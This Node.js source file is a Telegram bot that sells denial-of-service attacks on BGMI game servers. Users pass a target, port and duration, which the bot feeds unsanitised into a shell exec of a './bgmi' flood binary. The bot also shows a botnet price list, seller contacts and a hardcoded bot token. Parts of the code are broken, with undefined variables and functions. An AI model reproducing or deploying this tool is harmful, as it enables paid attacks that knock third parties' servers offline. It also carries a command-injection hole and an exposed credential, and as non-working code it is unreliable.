const telebot = require('telebot');
const { exec } = require('child_process');
const fs = require('fs');
const path = require('path');

// insert your Telegram bot token here
const bot = new telebot('7032639874:AAHjhuA5EhN--eQfvKD5QIkB5YgM_vdySWg');

// Admin user IDs
const admin_id = ["6942392489"];

// File to store allowed user IDs
const USER_FILE = "users.txt";

// File to store command logs
const LOG_FILE = "log.txt";

// Function to read user IDs from the file
function read_users() {
    try {
        const data = fs.readFileSync(USER_FILE, 'utf8');
        return data.split('\n');
    } catch (err) {
        return [];
    }
}

// Function to read free user IDs and their credits from the file
function read_free_users() {
    try {
        const data = fs.readFileSync(FREE_USER_FILE, 'utf8');
        const lines = data.split('\n');
        for (const line of lines) {
            if (line.trim()) {
                const [user_id, credits] = line.split(' ');
                free_user_credits[user_id] = parseInt(credits);
            } else {
                console.log(`Ignoring invalid line in free user file: ${line}`);
            }
        }
    } catch (err) {
        return;
    }
}

// List to store allowed user IDs
const allowed_user_ids = read_users();

// Function to log command to the file
function log_command(user_id, target, port, time) {
    const user_info = bot.getChat(user_id);
    const username = user_info.username ? `@${user_info.username}` : `UserID: ${user_id}`;
    const log_entry = `Username: ${username}\nTarget: ${target}\nPort: ${port}\nTime: ${time}\n\n`;
    fs.appendFileSync(LOG_FILE, log_entry);
}

// Function to clear logs
function clear_logs() {
    try {
        const data = fs.readFileSync(LOG_FILE, 'utf8');
        if (data === "") {
            return "Logs are already cleared. No data found ❌.";
        } else {
            fs.writeFileSync(LOG_FILE, "");
            return "Logs cleared successfully ✅";
        }
    } catch (err) {
        return "No logs found to clear.";
    }
}

// Function to record command logs
function record_command_logs(user_id, command, target=null, port=null, time=null) {
    let log_entry = `UserID: ${user_id} | Time: ${new Date().toISOString()} | Command: ${command}`;
    if (target) {
        log_entry += ` | Target: ${target}`;
    }
    if (port) {
        log_entry += ` | Port: ${port}`;
    }
    if (time) {
        log_entry += ` | Time: ${time}`;
    }
    fs.appendFileSync(LOG_FILE, log_entry + "\n");
}

bot.on('/add', (msg) => {
    const user_id = msg.chat.id.toString();
    if (admin_id.includes(user_id)) {
        const command = msg.text.split(' ');
        if (command.length > 1) {
            const user_to_add = command[1];
            if (!allowed_user_ids.includes(user_to_add)) {
                allowed_user_ids.push(user_to_add);
                fs.appendFileSync(USER_FILE, `${user_to_add}\n`);
                return bot.reply.text(msg.chat.id, `User ${user_to_add} Added Successfully 👍.`);
            } else {
                return bot.reply.text(msg.chat.id, "User already exists 🤦‍♂️.");
            }
        } else {
            return bot.reply.text(msg.chat.id, "Please specify a user ID to add 😒.");
        }
    } else {
        return bot.reply.text(msg.chat.id, "Only Admin Can Run This Command 😡.");
    }
});

bot.on('/remove', (msg) => {
    const user_id = msg.chat.id.toString();
    if (admin_id.includes(user_id)) {
        const command = msg.text.split(' ');
        if (command.length > 1) {
            const user_to_remove = command[1];
            if (allowed_user_ids.includes(user_to_remove)) {
                allowed_user_ids.splice(allowed_user_ids.indexOf(user_to_remove), 1);
                fs.writeFileSync(USER_FILE, allowed_user_ids.join('\n'));
                return bot.reply.text(msg.chat.id, `User ${user_to_remove} removed successfully 👍.`);
            } else {
                return bot.reply.text(msg.chat.id, `User ${user_to_remove} not found in the list ❌.`);
            }
        } else {
            return bot.reply.text(msg.chat.id, "Please Specify A User ID to Remove.\n✅ Usage: /remove <userid>");
        }
    } else {
        return bot.reply.text(msg.chat.id, "Only Admin Can Run This Command 😡.");
    }
});

bot.on('/clearlogs', (msg) => {
    const user_id = msg.chat.id.toString();
    if (admin_id.includes(user_id)) {
        try {
            const data = fs.readFileSync(LOG_FILE, 'utf8');
            if (data.trim() === "") {
                return bot.reply.text(msg.chat.id, "Logs are already cleared. No data found ❌.");
            } else {
                fs.writeFileSync(LOG_FILE, "");
                return bot.reply.text(msg.chat.id, "Logs Cleared Successfully ✅");
            }
        } catch (err) {
            return bot.reply.text(msg.chat.id, "No logs found to clear.");
        }
    } else {
        return bot.reply.text(msg.chat.id, "Only Admin Can Run This Command 😡.");
    }
});

bot.on('/allusers', (msg) => {
    const user_id = msg.chat.id.toString();
    if (admin_id.includes(user_id)) {
        try {
            const data = fs.readFileSync(USER_FILE, 'utf8');
            const user_ids = data.split('\n');
            if (user_ids.length > 0) {
                let response = "Authorized Users:\n";
                for (const user_id of user_ids) {
                    try {
                        const user_info = bot.getChat(parseInt(user_id));
                        const username = user_info.username;
                        response += `- @${username} (ID: ${user_id})\n`;
                    } catch (err) {
                        response += `- User ID: ${user_id}\n`;
                    }
                }
                return bot.reply.text(msg.chat.id, response);
            } else {
                return bot.reply.text(msg.chat.id, "No data found ❌");
            }
        } catch (err) {
            return bot.reply.text(msg.chat.id, "No data found ❌");
        }
    } else {
        return bot.reply.text(msg.chat.id, "Only Admin Can Run This Command 😡.");
    }
});

bot.on('/logs', (msg) => {
    const user_id = msg.chat.id.toString();
    if (admin_id.includes(user_id)) {
        if (fs.existsSync(LOG_FILE) && fs.statSync(LOG_FILE).size > 0) {
            try {
                const fileStream = fs.createReadStream(LOG_FILE);
                return bot.sendDocument(msg.chat.id, fileStream);
            } catch (err) {
                return bot.reply.text(msg.chat.id, "No data found ❌.");
            }
        } else {
            return bot.reply.text(msg.chat.id, "No data found ❌");
        }
    } else {
        return bot.reply.text(msg.chat.id, "Only Admin Can Run This Command 😡.");
    }
});

bot.on('/id', (msg) => {
    const user_id = msg.chat.id.toString();
    return bot.reply.text(msg.chat.id, `🤖Your ID: ${user_id}`);
});

bot.on('/bgmi', (msg) => {
    const user_id = msg.chat.id.toString();
    if (allowed_user_ids.includes(user_id)) {
        if (!admin_id.includes(user_id)) {
            if (bgmi_cooldown[user_id] && (new Date() - bgmi_cooldown[user_id]) / 1000 < COOLDOWN_TIME) {
                return bot.reply.text(msg.chat.id, "You Are On Cooldown ❌. Please Wait 1min Before Running The /bgmi Command Again.");
            }
            bgmi_cooldown[user_id] = new Date();
        }
        const command = msg.text.split(' ');
        if (command.length === 4) {
            const target = command[1];
            const port = parseInt(command[2]);
            const time = parseInt(command[3]);
            if (time > 281) {
                return bot.reply.text(msg.chat.id, "Error: Time interval must be less than 280.");
            } else {
                record_command_logs(user_id, '/bgmi', target, port, time);
                log_command(user_id, target, port, time);
                start_attack_reply(msg, target, port, time);
                const full_command = `./bgmi ${target} ${port} ${time} 300`;
                exec(full_command, (error, stdout, stderr) => {
                    if (error) {
                        console.error(`exec error: ${error}`);
                        return;
                    }
                    console.log(`stdout: ${stdout}`);
                    console.error(`stderr: ${stderr}`);
                });
                return bot.reply.text(msg.chat.id, `BGMI Attack Finished. Target: ${target} Port: ${port} Port: ${time}`);
            }
        } else {
            return bot.reply.text(msg.chat.id, "✅ Usage :- /bgmi <target> <port> <time>");
        }
    } else {
        return bot.reply.text(msg.chat.id, "❌ You Are Not Authorized To Use This Command ❌.");
    }
});

bot.on('/mylogs', (msg) => {
    const user_id = msg.chat.id.toString();
    if (allowed_user_ids.includes(user_id)) {
        try {
            const data = fs.readFileSync(LOG_FILE, 'utf8');
            const command_logs = data.split('\n');
            const user_logs = command_logs.filter(log => log.includes(`UserID: ${user_id}`));
            if (user_logs.length > 0) {
                return bot.reply.text(msg.chat.id, "Your Command Logs:\n" + user_logs.join('\n'));
            } else {
                return bot.reply.text(msg.chat.id, "❌ No Command Logs Found For You ❌.");
            }
        } catch (err) {
            return bot.reply.text(msg.chat.id, "No command logs found.");
        }
    } else {
        return bot.reply.text(msg.chat.id, "You Are Not Authorized To Use This Command 😡.");
    }
});

bot.on('/help', (msg) => {
    let help_text = `🤖 Available commands:\n💥 /bgmi : Method For Bgmi Servers.\n💥 /rules : Please Check Before Use !!.\n💥 /mylogs : To Check Your Recents Attacks.\n💥 /plan : Checkout Our Botnet Rates.\n🤖 To See Admin Commands:\n💥 /admincmd : Shows All Admin Commands.\nBuy From :- @IPxKING_OWNER\nOfficial Channel :- https://t.me/+6pLYLxgt8QI5ZmFl\n`;
    for (const handler of bot.messageHandlers) {
        if (handler.commands) {
            if (msg.text.startsWith('/help')) {
                help_text += `${handler.commands[0]}: ${handler.doc}\n`;
            } else if (handler.doc && handler.doc.toLowerCase().includes('admin')) {
                continue;
            } else {
                help_text += `${handler.commands[0]}: ${handler.doc}\n`;
            }
        }
    }
    return bot.reply.text(msg.chat.id, help_text);
});

bot.on('/start', (msg) => {
    const user_name = msg.from.first_name;
    const response = `👋🏻Welcome to Your Home, ${user_name}! Feel Free to Explore.\n🤖Try To Run This Command : /help\n✅Join :- https://t.me/HAT_BUG`;
    return bot.reply.text(msg.chat.id, response);
});

bot.on('/rules', (msg) => {
    const user_name = msg.from.first_name;
    const response = `${user_name} Please Follow These Rules ⚠️:\n1. Dont Run Too Many Attacks !! Cause A Ban From Bot\n2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot.\n3. We Daily Checks The Logs So Follow these rules to avoid Ban!!`;
    return bot.reply.text(msg.chat.id, response);
});

bot.on('/plan', (msg) => {
    const user_name = msg.from.first_name;
    const response = `${user_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos !!:\nVip 🌟 :\n-> Attack Time : 180 (S)\n> After Attack Limit : 5 Min\n-> Concurrents Attack : 3\nPr-ice List💸 :\nDay-->300 Rs\nWeek-->1000 Rs\nMonth-->2000 Rs`;
    return bot.reply.text(msg.chat.id, response);
});

bot.on('/admincmd', (msg) => {
    const user_name = msg.from.first_name;
    const response = `${user_name}, Admin Commands Are Here!!:\n💥 /add <userId> : Add a User.\n💥 /remove <userid> Remove a User.\n💥 /allusers : Authorised Users Lists.\n💥 /logs : All Users Logs.\n💥 /broadcast : Broadcast a Message.\n💥 /clearlogs : Clear The Logs File.`;
    return bot.reply.text(msg.chat.id, response);
});

bot.on('/broadcast', (msg) => {
    const user_id = msg.chat.id.toString();
    if (admin_id.includes(user_id)) {
        const command = msg.text.split(' ');
        if (command.length > 1) {
            const message_to_broadcast = `⚠️ Message To All Users By Admin:\n\n${command.slice(1).join(' ')}`;
            const data = fs.readFileSync(USER_FILE, 'utf8');
            const user_ids = data.split('\n');
            for (const user_id of user_ids) {
                try {
                    bot.sendMessage(user_id, message_to_broadcast);
                } catch (err) {
                    console.log(`Failed to send broadcast message to user ${user_id}: ${err}`);
                }
            }
            return bot.reply.text(msg.chat.id, "Broadcast Message Sent Successfully To All Users 👍.");
        } else {
            return bot.reply.text(msg.chat.id, "🤖 Please Provide A Message To Broadcast.");
        }
    } else {
        return bot.reply.text(msg.chat.id, "Only Admin Can Run This Command 😡.");
    }
});

bot.start();


